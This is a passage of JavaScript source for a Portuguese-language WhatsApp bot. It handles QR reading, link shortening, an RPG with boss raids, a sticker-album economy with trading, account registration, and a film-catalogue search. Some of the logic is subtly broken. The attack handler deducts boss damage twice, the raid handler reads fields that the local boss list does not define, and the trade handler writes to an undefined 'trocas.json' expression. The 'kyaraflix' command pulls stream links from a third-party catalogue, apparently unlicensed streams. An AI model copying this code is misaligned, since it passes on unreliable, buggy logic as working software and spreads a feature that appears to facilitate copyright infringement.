    return reply("❌ Responda uma imagem com QR Code.");
}

const msg = {
    message: quoted
};

const buffer = await downloadMediaMessage(
    msg,
    "buffer",
    {},
    {
        logger
    }
);

const image = await Jimp.read(buffer);

const qr = new QrCode();

const texto = await new Promise((resolve, reject) => {

    qr.callback = (err, value) => {
        if (err) return reject(err);
        resolve(value?.result);
    };

    qr.decode(image.bitmap);

});

if (!texto) {
    return reply("❌ Não encontrei nenhum QR Code nessa imagem.");
}

await conn.sendMessage(
    from,
    {
        text:
`📱 *QR CODE LIDO*

🔗 Resultado:
${texto}`
    },
    {
        quoted: m
    }
);

await reagir(from, "✅");


} catch (e) {

console.error("[LERQR]", e);

await reagir(from, "❌");

reply(
`❌ Erro ao ler QR Code.\n\n${e.message || e}`
);

}
}
break;

case 'encurta':
case 'short':
case 'shorturl': {
try {

if (!q) {
return reply(`🔗 *ENCURTAR LINK*

Use:
${prefix + command} https://exemplo.com`);
}

const axios = require("axios");

await reagir(from, "⏳");

const url = q.trim();

if (!/^https?:\/\//i.test(url)) {
await reagir(from, "❌");
return reply("❌ Envie um link válido começando com http:// ou https://");
}

const { data } = await axios.get(
`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`,
{
timeout: 15000
}
);

if (!data || !data.startsWith("https://")) {
throw new Error(data);
}

await conn.sendMessage(
from,
{
text: `🔗 *LINK ENCURTADO*

📎 Original:
${url}

✂️ Novo link:
${data.trim()}`
},
{
quoted: m
}
);

await reagir(from, "✅");

} catch (e) {

console.error("[ENCURTA]", e.message);

await reagir(from, "❌");

if (e.message.includes("blacklist")) {
return reply(
`❌ *Link bloqueado*

O is.gd recusou esse endereço por segurança.

Tente usar outro domínio ou outro link.`
);
}

reply(`❌ Erro ao encurtar:\n${e.message}`);

}
}
break;

case 'escolher': {
try {

const classe = q.toLowerCase().trim();

if(!classe) return reply(
`❌ Escolha uma classe.

Exemplo:
${prefix}escolher guerreiro`
);


if(!classesRPG[classe]) {

return reply(
`❌ Classe inválida.

Classes disponíveis:

⚔️ guerreiro
🏹 arqueiro
🧙 mago
🛡️ paladino
🗡️ assassino`
);

}


// banco

const bancoPath = './database/banco.json';

if(!fs.existsSync(bancoPath)){
fs.writeFileSync(bancoPath,'{}');
}


let banco = JSON.parse(
fs.readFileSync(bancoPath)
);


const id = sender;


if(!banco[id]){

banco[id] = {
saldo:0,
xp:0,
nivel:1,
inventario:{}
};

}


// cria RPG

salvarClasse(
banco[id],
classe
);


// salva

fs.writeFileSync(
bancoPath,
JSON.stringify(banco,null,2)
);



const c = classesRPG[classe];


await conn.sendMessage(from,{
text:
`╔═══━━ ⚔️ RPG INICIADO ⚔️ ━━═══╗

🎉 Classe escolhida!

${c.nome}

📜 Descrição:
${c.descricao}

━━━━━━━━━━━━━━

❤️ HP:
${c.hp}

⚔️ ATK:
${c.atk}

🛡️ DEF:
${c.def}

💥 CRIT:
${c.crit}%

━━━━━━━━━━━━━━

🚀 Sua aventura começou!

╚═══━━ 🔥 Kyara RPG 🔥 ━━═══╝`,
mentions:[sender]
},
{
quoted:selo
});


} catch(e){

console.log("ERRO ESCOLHER:",e);
reply("❌ Erro ao escolher classe.");

}

}
break;

case 'classes': {
try {

await reagir(from, "⚔️");

const classes = [
{
id:"guerreiro",
nome:"⚔️ Guerreiro",
img:"https://files.catbox.moe/az2dq7.jpg",
desc:
`🛡️ Classe equilibrada

❤️ HP: 150
⚔️ ATK: 25
🛡️ DEF: 15
💥 CRIT: 5%`
},

{
id:"arqueiro",
nome:"🏹 Arqueiro",
img:"https://files.catbox.moe/5g27of.jpg",
desc:
`🎯 Especialista em críticos

❤️ HP: 120
⚔️ ATK: 22
🛡️ DEF: 10
💥 CRIT: 15%`
},

{
id:"mago",
nome:"🧙 Mago",
img:"https://files.catbox.moe/q2tevd.jpg",
desc:
`✨ Mestre da magia

❤️ HP: 100
⚔️ ATK: 35
🛡️ DEF: 8
💥 CRIT: 10%`
},

{
id:"paladino",
nome:"🛡️ Paladino",
img:"https://files.catbox.moe/zbw5nb.jpg",
desc:
`🛡️ Defensor supremo

❤️ HP: 180
⚔️ ATK: 18
🛡️ DEF: 25
💥 CRIT: 3%`
},

{
id:"assassino",
nome:"🗡️ Assassino",
img:"https://files.catbox.moe/zut710.jpg",
desc:
`💀 Mestre dos críticos

❤️ HP: 110
⚔️ ATK: 28
🛡️ DEF: 8
💥 CRIT: 25%`
}

];


const cards = [];


for(const c of classes){

const media = await prepareWAMessageMedia(
{
image: {
url: c.img
}
},
{
upload: conn.waUploadToServer
}
);



cards.push({

header:{
title:c.nome,
hasMediaAttachment:true,
imageMessage:media.imageMessage
},

body:{
text:c.desc
},

nativeFlowMessage:{
buttons:[
{
name:"quick_reply",
buttonParamsJson:JSON.stringify({

display_text:`Escolher ${c.nome}`,

id:`${prefix}escolher ${c.id}`

})
}
]
}

});

}



const msg = generateWAMessageFromContent(from,{

viewOnceMessage:{
message:{
interactiveMessage:{

header:{
title:"🎮 Escolha seu personagem"
},

body:{
text:"⚔️ Cada classe possui habilidades únicas!"
},

footer:{
text:"🔥 Kyara RPG"
},

carouselMessage:{
cards
}

}
}
}

},{userJid:conn.user.id});



await conn.relayMessage(
from,
msg.message,
{
messageId:msg.key.id
}
);


await reagir(from,"✅");


} catch(e){

console.log("ERRO CLASSE:",e);
await reagir(from,"❌");
reply("❌ Erro ao carregar classes.");

}

}
break;

case 'raid': {
try {

if (!isGroup)
return reply("❌ A raid só pode ser iniciada em grupos.");

if (global.raids[from])
return reply("⚔️ Já existe uma raid acontecendo nesse grupo.");

const boss = bossesRaid[
Math.floor(Math.random() * bossesRaid.length)
];

const bosses = [
{ nome: '🐉 Dragão Ancestral', vida: 5000, poder: 90, premio: 3500, xp: 450 },
{ nome: '👹 Demônio Infernal', vida: 7000, poder: 120, premio: 5000, xp: 650 },
{ nome: '🧟 Rei Zumbi', vida: 4000, poder: 70, premio: 2500, xp: 350 },
{ nome: '🦇 Vampiro Sombrio', vida: 4500, poder: 85, premio: 3000, xp: 400 },
{ nome: '💀 Caveira Titã', vida: 6000, poder: 110, premio: 4500, xp: 550 }
];

global.raids[from] = {

boss: {
nome: boss.nome,
hp: boss.hp,
hpMax: boss.hp,
atk: boss.atk,
premio: boss.premio,
xp: boss.xp
},

jogadores: {},

estado: "entrando",

criador: sender,

inicio: Date.now()

};


await conn.sendMessage(from,{
text:
`
╔═══━━━ ⚔️ RAID RPG ⚔️ ━━━═══╗

👹 Um novo boss apareceu!

${boss.nome}

❤️ Vida:
${barraHP(boss.hp,boss.hp)}
${boss.hp}/${boss.hp}

⚔️ Ataque:
${boss.atk}

💰 Recompensa:
$${boss.premio}

⭐ XP:
${boss.xp}

━━━━━━━━━━━━━━

👥 Digite:
${prefix}entrar

para participar!

⏳ A batalha começa em 30 segundos.

╚══════════════════╝
`
},{quoted:selo});


// inicia contagem

setTimeout(async()=>{

if(!global.raids[from]) return;

const raid = global.raids[from];

if(Object.keys(raid.jogadores).length < 1){

delete global.raids[from];

return conn.sendMessage(from,{
text:"❌ Ninguém entrou na raid. Cancelada."
});

}


raid.estado="batalha";


await conn.sendMessage(from,{
text:
`
⚔️ RAID INICIADA!

👹 ${raid.boss.nome}

❤️ Vida:
${barraHP(
raid.boss.hp,
raid.boss.hpMax
)}

Jogadores:
${Object.keys(raid.jogadores)
.map(x=>"• @"+x.split("@")[0])
.join("\n")}

Use:
⚔️ ${prefix}atacar

Boa sorte!
`,
mentions:Object.keys(raid.jogadores)
});

},30000);


} catch(e){

console.log(e);

reply("❌ Erro ao iniciar raid.");

}

}
break

// ===============================
// ENTRAR NA RAID
// ===============================

case 'entrar': {
try {

if(!isGroup)
return reply("❌ Só funciona em grupo.");

const raid = global.raids[from];

if(!raid)
return reply("❌ Não existe nenhuma raid ativa.");

if(raid.estado !== "entrando")
return reply("⚔️ A raid já começou.");

const id = sender.split("@")[0];


if(raid.jogadores[id])
return reply("⚠️ Você já entrou na raid.");


if(!global.banco) global.banco = {};


if(!global.banco[id]){

global.banco[id] = {

saldo:0,
xp:0,
nivel:1,

atk:50,
def:30,
hp:1000,

vitorias:0,
derrotas:0,

inventario:{}

};

}


let player = global.banco[id];


raid.jogadores[id] = {

hp: player.hp || 1000,

hpMax: player.hp || 1000,

atk: player.atk || 50,

def: player.def || 30,

dano:0

};


await conn.sendMessage(from,{
text:
`
⚔️ *GUERREIRO ENTROU NA RAID*

👤 @${id}

❤️ Vida:
${player.hp}

⚔️ Ataque:
${player.atk}

🛡️ Defesa:
${player.def}

👥 Total:
${Object.keys(raid.jogadores).length}
`,
mentions:[sender]
});


} catch(e){

console.log(e);
reply("❌ Erro ao entrar na raid.");

}

}
break;



// ===============================
// ATACAR BOSS
// ===============================

case 'atacar': {

try {

const raid = global.raids[from];

if(!raid)
return reply("❌ Não existe raid ativa.");

if(raid.estado !== "batalha")
return reply("⏳ A batalha ainda não começou.");


const id = sender.split("@")[0];


const player = raid.jogadores[id];


if(!player)
return reply("❌ Você não está participando da raid.");


// dano base

let dano = Math.floor(
Math.random() * player.atk
) + player.atk;


// crítico

let critico = false;


if(Math.random() <= 0.15){

dano *= 2;
critico=true;

}


// tira vida do boss

raid.boss.hp -= dano;

if(raid.boss.hp < 0)
raid.boss.hp = 0;


player.dano += dano;



let msg =
`
⚔️ *ATAQUE*

👤 @${id}

💥 Dano causado:
${dano}
`;


if(critico){

msg += `
🔥 CRÍTICO!
`;

}



msg += `

👹 ${raid.boss.nome}

❤️ Vida:

${barraHP(
raid.boss.hp,
raid.boss.hpMax
)}

${raid.boss.hp}/${raid.boss.hpMax}
`;



await conn.sendMessage(from,{
text:msg,
mentions:[sender]
});


// verifica vitória

raid.boss.hp -= dano;

if(raid.boss.hp < 0)
raid.boss.hp = 0;


player.dano += dano;


// verifica se o boss morreu

if(raid.boss.hp <= 0){

await finalizarRaid(from, conn);

return;

}



} catch(e){

console.log(e);

reply("❌ Erro no ataque.");

}

}
break;

// ===============================
// DEFENDER
// ===============================

case 'defender': {

try {

const raid = global.raids[from];

if(!raid)
return reply("❌ Não existe raid ativa.");

if(raid.estado !== "batalha")
return reply("⏳ A batalha ainda não começou.");

const id = sender.split("@")[0];

const player = raid.jogadores[id];


if(!player)
return reply("❌ Você não está na raid.");

player.defendendo = true;


await conn.sendMessage(from,{
text:
`
🛡️ *DEFESA ATIVADA*

👤 @${id}

Você irá receber menos dano no próximo ataque do boss.
`,
mentions:[sender]
});


// boss ataca depois

await ataqueBoss(from, conn);


} catch(e){

console.log(e);

}

}

break;



// ===============================
// CURAR
// ===============================

case 'cura': {

try {

const raid = global.raids[from];

if(!raid)
return reply("❌ Não existe raid.");

const id = sender.split("@")[0];

const player = raid.jogadores[id];


if(!player)
return reply("❌ Você não está na raid.");



let cura = Math.floor(
Math.random()*300
)+200;


player.hp += cura;


if(player.hp > player.hpMax)
player.hp = player.hpMax;



await conn.sendMessage(from,{
text:
`
❤️ *CURA*

👤 @${id}

Recuperou:
+${cura} HP

Vida:
${player.hp}/${player.hpMax}
`,
mentions:[sender]
});


await ataqueBoss(from,conn);



} catch(e){

console.log(e);

}

}

break;

case 'venderfig': {
try {

let banco = JSON.parse(fs.readFileSync(bancoPath));

const user = getUserBancoId(info, sender, isGroup);


const idFig = Number(args[0]);


if (!idFig) {
return reply(`❌ Informe o ID da figurinha.

Exemplo:
${prefix}venderfig 15`);
}


if (!banco[user]?.album?.repetidas[idFig]) {
return reply("❌ Você não possui essa figurinha repetida.");
}


const quantidade = banco[user].album.repetidas[idFig];


const fig = figurinhas.find(
f => f.id == idFig
);


if (!fig) {
return reply("❌ Figurinha não encontrada.");
}


// Valor pela raridade

let valor = 0;


switch(fig.raridade) {

case 'comum':
valor = 150;
break;

case 'rara':
valor = 500;
break;

case 'epica':
valor = 2000;
break;

case 'lendaria':
valor = 10000;
break;

default:
valor = 100;
}


// Vende somente uma unidade

banco[user].album.repetidas[idFig]--;

if (banco[user].album.repetidas[idFig] <= 0) {
delete banco[user].album.repetidas[idFig];
}


banco[user].saldo += valor;


fs.writeFileSync(
bancoPath,
JSON.stringify(banco,null,2)
);


reply(`╭━━━〔 💰 𝐕𝐄𝐍𝐃𝐀 𝐃𝐄 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀 〕━━━⬣
┃
┃ 🃏 ${fig.nome}
┃ 🌎 ${fig.pais}
┃ ⭐ ${fig.raridade}
┃
┃ 💵 Valor recebido:
┃ +$${valor}
┃
┃ 🏦 Saldo atual:
┃ $${banco[user].saldo}
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);


} catch(e){

console.log(e);
reply("❌ Erro ao vender figurinha.");

}

}
break;

case 'recusar': {
try {

const trocaPath = './database/trocas.json';

if (!fs.existsSync(trocaPath)) {
return reply("❌ Não existe nenhuma troca pendente.");
}

let trocas = JSON.parse(fs.readFileSync(trocaPath));


let chave = Object.keys(trocas).find(
x => trocas[x].para == sender
);


if (!chave) {
return reply("❌ Você não possui nenhuma troca pendente.");
}


delete trocas[chave];


fs.writeFileSync(
trocaPath,
JSON.stringify(trocas,null,2)
);


reply(`╭━━━〔 ❌ 𝐓𝐑𝐎𝐂𝐀 𝐑𝐄𝐂𝐔𝐒𝐀𝐃𝐀 〕━━━⬣
┃
┃ A troca foi cancelada.
┃
┃ Nenhuma figurinha foi alterada.
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);


} catch(e){

console.log(e);
reply("❌ Erro ao recusar troca.");

}

}
break;

case 'aceitar': {
try {
const trocaPath = './database/trocas.json';

if (!fs.existsSync(trocaPath)) {
return reply("❌ Não existe nenhuma troca pendente.");
}

let banco = JSON.parse(fs.readFileSync(bancoPath));
let trocas = JSON.parse(fs.readFileSync(trocaPath));


const user = getUserBancoId(info, sender, isGroup);


// Procura uma troca destinada a você

let chave = Object.keys(trocas).find(
x => trocas[x].para == sender
);


if (!chave) {
return reply("❌ Você não possui nenhuma troca pendente.");
}


const troca = trocas[chave];


const jogador1 = chave;
const jogador2 = sender;


if (!banco[jogador1]?.album || !banco[jogador2]?.album) {
return reply("❌ Usuário sem álbum.");
}


// Verifica novamente

if (!banco[jogador1].album.colecao.includes(troca.de)) {
return reply("❌ O jogador não possui mais essa figurinha.");
}

if (!banco[jogador2].album.colecao.includes(troca.receber)) {
return reply("❌ Você não possui mais essa figurinha.");
}


// Faz a troca

banco[jogador1].album.colecao =
banco[jogador1].album.colecao.filter(
id => id != troca.de
);

banco[jogador2].album.colecao =
banco[jogador2].album.colecao.filter(
id => id != troca.receber
);


// Adiciona

banco[jogador1].album.colecao.push(troca.receber);

banco[jogador2].album.colecao.push(troca.de);


// Remove troca

delete trocas[chave];


fs.writeFileSync(
bancoPath,
JSON.stringify(banco,null,2)
);

fs.writeFileSync(
trocaPath,
JSON.stringify(trocas,null,2)
);


reply(`╭━━━〔 ✅ 𝐓𝐑𝐎𝐂𝐀 𝐑𝐄𝐀𝐋𝐈𝐙𝐀𝐃𝐀 〕━━━⬣
┃
┃ 🤝 A troca foi concluída!
┃
┃ 📦 As figurinhas foram trocadas com sucesso.
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);


} catch(e){

console.log(e);
reply("❌ Erro ao aceitar troca.");

}

}
break;

case 'trocar': {
try {

if (!isGroup) {
return reply("❌ Use esse comando em grupo.");
}

const trocaPath = './database/trocas.json';

if (!fs.existsSync(trocaPath)) {
fs.writeFileSync(trocaPath, '{}');
}

let banco = JSON.parse(fs.readFileSync(bancoPath));
let trocas = JSON.parse(fs.readFileSync(trocaPath));


const user = getUserBancoId(info, sender, isGroup);


if (!args[0]) {
return reply(`🤝 Use assim:

${prefix}trocar @pessoa

Exemplo:
${prefix}trocar @Joao 15 30`);
}


const alvo = args[0].replace(/\D/g,'');

if (!alvo) {
return reply("❌ Marque alguém para trocar.");
}


const idDar = Number(args[1]);
const idReceber = Number(args[2]);


if (!idDar || !idReceber) {
return reply("❌ Informe as duas figurinhas.");
}


const outro = alvo + "@s.whatsapp.net";


if (!banco[user].album.colecao.includes(idDar)) {
return reply("❌ Você não possui essa figurinha.");
}


if (!banco[outro]?.album?.colecao.includes(idReceber)) {
return reply("❌ O outro jogador não possui essa figurinha.");
}


trocas[sender] = {

de: idDar,
receber: idReceber,
para: outro

};


fs.writeFileSync(
trocas.json,
JSON.stringify(trocas,null,2)
);


const fig1 = figurinhas.find(f=>f.id == idDar);
const fig2 = figurinhas.find(f=>f.id == idReceber);


reply(`╭━━━〔 🤝 𝐓𝐑𝐎𝐂𝐀 𝐃𝐄 𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀𝐒 〕━━━⬣
┃
┃ 👤 ${pushname} quer trocar:
┃
┃ 📤 Dá:
┃ ${fig1.nome}
┃ #${idDar}
┃
┃ 📥 Recebe:
┃ ${fig2.nome}
┃ #${idReceber}
┃
┃ O outro jogador deve usar:
┃ ${prefix}aceitar
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);


} catch(e){

console.log(e);
reply("❌ Erro na troca.");

}

}
break;

case 'rankingalbum': {
try {

if (!fs.existsSync(bancoPath)) {
fs.writeFileSync(bancoPath, '{}');
}

let banco = JSON.parse(fs.readFileSync(bancoPath));


let ranking = Object.entries(banco)
.filter(([id, user]) => user.album)
.map(([id, user]) => {

return {
id,
nome: id,
quantidade: user.album.colecao.length
};

})
.sort((a,b) => b.quantidade - a.quantidade)
.slice(0,10);


if (ranking.length === 0) {
return reply('🏆 Ainda não existe nenhum colecionador.');
}


let texto = `╭━━━〔 🏆 𝐑𝐀𝐍𝐊𝐈𝐍𝐆 𝐃𝐀 𝐂𝐎𝐏𝐀 〕━━━⬣\n┃\n`;


ranking.forEach((pessoa, i) => {

let medalha;

if (i === 0) medalha = "🥇";
else if (i === 1) medalha = "🥈";
else if (i === 2) medalha = "🥉";
else medalha = `${i+1}°`;

texto += `┃ ${medalha} ${pessoa.nome}\n`;
texto += `┃ 📖 ${pessoa.quantidade}/${figurinhas.length}\n`;
texto += `┃\n`;

});


texto += `╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`;

reply(texto);


} catch (e) {

console.log(e);
reply('❌ Erro ao gerar ranking.');

}

}
break;

case 'figurinhas': {
try {

if (!fs.existsSync(bancoPath)) {
fs.writeFileSync(bancoPath, '{}');
}

let banco = JSON.parse(fs.readFileSync(bancoPath));

const user = getUserBancoId(info, sender, isGroup);

if (!banco[user]) {
banco[user] = {
saldo: 0,
xp: 0
};
}

if (!banco[user].album) {
banco[user].album = {
colecao: [],
repetidas: {},
completo: false,
recompensas: {
"30": false,
"60": false,
"90": false,
"100": false
}
};

fs.writeFileSync(
bancoPath,
JSON.stringify(banco, null, 2)
);
}

const repetidas = banco[user].album.repetidas;

const ids = Object.keys(repetidas);

if (ids.length === 0) {
return reply(`📚 Você não possui figurinhas repetidas.

Abra pacotinhos com:
${prefix}pacotinho`);
}

let texto = `╭━━━〔 ♻️ 𝐑𝐄𝐏𝐄𝐓𝐈𝐃𝐀𝐒 〕━━━⬣\n┃\n`;

let total = 0;

for (let id of ids) {

const fig = figurinhas.find(
f => f.id == id
);

if (fig) {

texto += `┃ ${fig.id}. ${fig.nome}\n`;
texto += `┃ 🌎 ${fig.pais}\n`;
texto += `┃ ⭐ ${fig.raridade}\n`;
texto += `┃ 📦 Quantidade: ${repetidas[id]}\n`;
texto += `┃\n`;

total += repetidas[id];

}

}

texto += `┣━━━〔 📊 TOTAL 〕━━━⬣\n`;
texto += `┃ ♻️ Repetidas: ${total}\n`;
texto += `┃\n`;
texto += `╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`;

reply(texto);


} catch (e) {

console.log(e);
reply('❌ Erro ao mostrar figurinhas.');

}

}
break;

case 'album': {
try {

const fs = require('fs');
const totalAlbum = 960;

if (!fs.existsSync(bancoPath)) {
return reply('❌ Banco não encontrado.');
}

let banco = JSON.parse(fs.readFileSync(bancoPath));

const user = getUserBancoId(info, sender, isGroup);

if (!banco[user] || !banco[user].album) {
return reply('❌ Você ainda não possui nenhuma figurinha.');
}

const colecao = banco[user].album.colecao || [];

if (colecao.length === 0) {
return reply(`╭━━━〔 🏆 ÁLBUM DA COPA 〕━━━⬣
┃
┃ 📖 Você ainda não possui figurinhas.
┃
╰━━━〔 ❤️‍🔥 KYARA 〕━━━⬣`);
}

const ordem = {
mitica: 1,
lendaria: 2,
epica: 3,
rara: 4,
incomum: 5
};

const lista = figurinhas
.filter(f => colecao.includes(f.id))
.sort((a, b) => {
const raridade = ordem[a.raridade] - ordem[b.raridade];
if (raridade !== 0) return raridade;
return a.id - b.id;
});

let texto = `╭━━━〔 🏆 ÁLBUM DA COPA 〕━━━⬣
┃
┃ 📖 ${colecao.length}/${totalAlbum}
┃
`;

let ultimaRaridade = "";

const nomes = {
mitica: "👑 MÍTICAS",
lendaria: "🌟 LENDÁRIAS",
epica: "💜 ÉPICAS",
rara: "🔵 RARAS",
incomum: "⚪ INCOMUNS"
};

for (const fig of lista) {

if (fig.raridade !== ultimaRaridade) {
ultimaRaridade = fig.raridade;
texto += `┣━━━〔 ${nomes[fig.raridade]} 〕━━━⬣\n`;
}

texto += `┃ ${fig.id}. ${fig.nome}\n`;

}

texto += `┃
╰━━━〔 ❤️‍🔥 KYARA 〕━━━⬣`;

reply(texto);

} catch (e) {
console.log(e);
reply("❌ Erro ao abrir o álbum.");
}
}
break;

case 'pacotinho': {
try {

console.log("TOTAL FIGURINHAS:", figurinhas.length);

if (!fs.existsSync(bancoPath)) {
fs.writeFileSync(bancoPath, '{}');
}

let banco = JSON.parse(fs.readFileSync(bancoPath));

const user = getUserBancoId(info, sender, isGroup);

if (!banco[user]) {
banco[user] = {
saldo: 0,
xp: 0,
album: {
colecao: [],
repetidas: {},
completo: false
}
};
}

if (!banco[user].album) {
banco[user].album = {
colecao: [],
repetidas: {},
completo: false,
recompensas: {
"30": false,
"60": false,
"90": false,
"100": false
}
};

fs.writeFileSync(
bancoPath,
JSON.stringify(banco, null, 2)
);
}

const preco = 1000;
const totalAlbum = 960; // Quantidade fixa do álbum

if (banco[user].saldo < preco) {
return reply(`╭━━━〔 🏦 𝐙𝐘𝐑𝐎𝐍 𝐁𝐀𝐍𝐊 〕━━━⬣
┃ ❌ Saldo insuficiente.
┃
┃ 🎁 Pacotinho: $${preco}
┃ 💰 Seu saldo: $${banco[user].saldo}
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);
}

banco[user].saldo -= preco;


function sortearFigurinha() {

const sorte = Math.random() * 100;

let raridade;

if (sorte <= 60) {
raridade = "incomum";
} else if (sorte <= 85) {
raridade = "rara";
} else if (sorte <= 97) {
raridade = "epica";
} else {
raridade = "lendaria";
}


let lista = figurinhas.filter(
f => f.raridade === raridade
);


// Caso não encontre, pega qualquer uma
if (lista.length === 0) {
lista = figurinhas;
}


return lista[
Math.floor(Math.random() * lista.length)
];

}


let resultado = [];

let quantidade = 5;

const evento = Math.floor(Math.random() * 100) + 1;


// Eventos

if (evento <= 5) {

quantidade = 10;

resultado.push(
"🟡 PACOTE DOURADO! Vieram 10 figurinhas!"
);

}

else if (evento <= 8) {

quantidade = 15;

resultado.push(
"💎 PACOTE DIAMANTE! Vieram 15 figurinhas!"
);

}

else if (evento <= 12) {

banco[user].saldo += 10000;

resultado.push(
"🎁 Sorte grande! Você ganhou $10.000!"
);

}


// Abrir figurinhas

for (let i = 0; i < quantidade; i++) {

const fig = sortearFigurinha();

if (!fig) continue;


if (banco[user].album.colecao.includes(fig.id)) {

banco[user].album.repetidas[fig.id] =
(banco[user].album.repetidas[fig.id] || 0) + 1;

resultado.push(`♻️ ${fig.nome} (${fig.raridade})`);

} else {

banco[user].album.colecao.push(fig.id);

resultado.push(`🆕 ${fig.nome} (${fig.raridade})`);

}

}


// Completar álbum

const progresso = Math.floor(
(banco[user].album.colecao.length / totalAlbum) * 100
);


let premio = 0;
let mensagemPremio = "";


if (progresso >= 30 && !banco[user].album.recompensas["30"]) {

premio = 50000;
mensagemPremio += "\n🥉 30% completo: +$50.000";

banco[user].album.recompensas["30"] = true;

}


if (progresso >= 60 && !banco[user].album.recompensas["60"]) {

premio = premio + 150000;
mensagemPremio += "\n┃🥈 60% completo: +$150.000";

banco[user].album.recompensas["60"] = true;

}


if (progresso >= 90 && !banco[user].album.recompensas["90"]) {

premio = premio + 500000;
mensagemPremio += "\n┃🥇 90% completo: +$500.000";

banco[user].album.recompensas["90"] = true;

}


if (progresso >= 100 && !banco[user].album.recompensas["100"]) {

premio = premio + 2000000;
mensagemPremio += "\n┃🏆 Álbum completo: +$2.000.000";

banco[user].album.recompensas["100"] = true;

}


if (premio > 0) {

banco[user].saldo += premio;

resultado.push(
`┃🎉 Recompensas recebidas:${mensagemPremio}`
);

}

if (
banco[user].album.colecao.length >= totalAlbum &&
!banco[user].album.completo
) {

banco[user].album.completo = true;
banco[user].saldo += 2000000000000;

resultado.push(
"🏆 ÁLBUM COMPLETO! +$2.000.000.000.000"
);

}


fs.writeFileSync(
bancoPath,
JSON.stringify(banco, null, 2)
);


reply(`╭━━━〔 🎁 𝐏𝐀𝐂𝐎𝐓𝐈𝐍𝐇𝐎 𝐃𝐀 𝐂𝐎𝐏𝐀 〕━━━⬣
┃
┃ 💸 Valor: $${preco}
┃ 📦 Quantidade: ${quantidade} figurinhas:
┃
${resultado.map(x => `┃ ${x}`).join('\n')}
┃
┣━━━〔 🏆 ÁLBUM 〕━━━⬣
┃ 📖 ${banco[user].album.colecao.length}/${totalAlbum}
┃
┃ 💰 Saldo: $${banco[user].saldo}
┃
╰━━━〔 ❤️‍🔥 𝐙𝐘𝐑𝐎𝐍-𝐌𝐃 〕━━━⬣`);

} catch (e) {
console.log(e);

reply(`❌ Erro ao abrir o pacotinho.`);
}

}
break;

case 'registrar': {
const db = carregarBanco();
const userId = getUserBancoId(info, sender, isGroup);

if (db[userId]) {
return reply(`❌ Você já possui uma conta registrada!`);
}

db[userId] = {
    saldo: 0,
    xp: 0,
    inventario: {},
    pets: {},
    pescaPendente: null,
    mineracaoPendente: null,
    cacaPendente: null,
    batalhaNaval: {
        partidas: 0,
        vitorias: 0,
        derrotas: 0,
        recompensaTotal: 0
    },
    emprego: "Desempregado",
    empregoId: 0,
    lastWork: 0
};

salvarBanco(db);

return reply(`╭━━〔 📝 REGISTRO 〕━━⬣
┃ ✅ Conta criada com sucesso!
┃
┃ 💰 Saldo: R$0
┃ ⭐ XP: 0
┃ 💼 Emprego: Desempregado
┃ 🎒 Inventário criado
┃ 🐾 Pets criado
┃ ⚔️ Batalha Naval criada
┃
┃ Use ${prefix}empregos para escolher um emprego.
╰━━━━━━━━━━━━━━⬣`);
}
break;

case 'kyaraflix': {
try {

if (!q) return reply(`Uso: ${prefix}${command} <filme ou série>\nEx: ${prefix}${command} Deadpool`);

await reagir(from, "🔎");

const pesquisa = q.trim().toLowerCase()
.normalize("NFD")
.replace(/[\u0300-\u036f]/g, "")
.replace(/[^\w\s]/g, " ")
.trim();


const res = await fetch(
'http://br2.bronxyshost.com:4009/lista.json'
);

if (!res.ok) throw new Error("CATALOGO_OFF");

const catalogo = await res.json();

let encontrados = [];
let vistos = new Set();


for (let item of catalogo) {

if (!item.link) continue;

if (
item.categoria &&
item.categoria.toLowerCase().includes("24h")
) continue;


let nome = item.nome || "Sem nome";

let nomeBusca = nome.toLowerCase()
.normalize("NFD")
.replace(/[\u0300-\u036f]/g, "")
.replace(/[^\w\s]/g, " ");


let catBusca = (item.categoria || "")
.toLowerCase();


if (
nomeBusca.includes(pesquisa) ||
catBusca.includes(pesquisa)
) {


let tipo = "🎬 Filme";

if (
/s\d+e\d+/i.test(nome) ||
/temporada|epis[oó]dio/i.test(nome)
) {
tipo = "📺 Série";
}


let id = nome + tipo;

if (!vistos.has(id)) {

vistos.add(id);

encontrados.push({
nome,
tipo,
categoria: item.categoria || "Geral",
logo: item.logo || "",
link: item.link,
formato: item.tipo || "M3U8"
});

}

}

}


if (!encontrados.length) {
await reagir(from, "❌");
return reply(`❌ Nenhum resultado encontrado para: ${q}`);
}


const cards = [];


for (let i = 0; i < Math.min(10, encontrados.length); i++) {

const item = encontrados[i];


let media;

if (item.logo) {
media = await prepareWAMessageMedia(
{ image: { url: item.logo } },
{ upload: conn.waUploadToServer }
);
}


cards.push({

header: {
title: `🎬 ${item.nome}`,
subtitle: `${item.tipo} • ${item.categoria}`,
hasMediaAttachment: !!media,
imageMessage: media?.imageMessage
},

body: {
text:
`📂 Categoria: ${item.categoria}

🎞️ Tipo: ${item.tipo}
📺 Formato: ${item.formato}`
},

footer: {
text: `${NomeBot} ❤️`
},

nativeFlowMessage: {
buttons: [
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "🔗 Abrir Link",
url: item.link
})
}
]

}

});

}



const msg = generateWAMessageFromContent(from, {

viewOnceMessage: {

message: {

interactiveMessage: {

header: {
title: "🎬 Kyara Flix"
},

body: {
text:
`🔎 Pesquisa: *${q}*

📊 Resultados: *${cards.length}*`
},

footer: {
text: `${NomeBot} 🚀`
},

carouselMessage: {
cards
}

}

}

}

}, { userJid: conn.user.id });



await conn.relayMessage(
from,
msg.message,
{
messageId: msg.key.id
}
);


await reagir(from, "✅");


} catch(e) {

console.log("Erro KyaraFlix:", e);

await reagir(from, "❌");

reply("❌ Erro ao carregar o Kyara Flix.");

}

